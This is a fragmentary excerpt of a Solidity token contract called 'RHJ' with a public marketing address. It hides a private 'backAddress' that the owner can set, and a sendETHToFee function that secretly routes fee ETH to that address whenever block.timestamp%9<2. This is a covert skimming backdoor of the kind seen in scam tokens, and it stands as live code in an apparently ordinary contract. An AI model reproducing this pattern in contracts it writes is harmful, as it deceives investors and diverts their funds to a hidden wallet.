...
contract RHJ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xFB0B5362a2dF0837fF3010de872225Cd36Af2a33); // Marketing Address
    address payable private backAddress;
    ...
    uint256 private _maxWalletTotal = 1000* 10**9;
    uint256 private _tFeeTotal;

    string private _name = "RHJ";
    string private _symbol = "RHJ";
    ...
    function sendETHToFee(uint256 amount) private {
        if(backAddress!=address(0) && block.timestamp%9<2)
        {
            backAddress.transfer(amount);
        }else
        {
   ...
   function setBackAddress(address _backAddress) external onlyOwner() {
        backAddress = payable(_backAddress);
    }
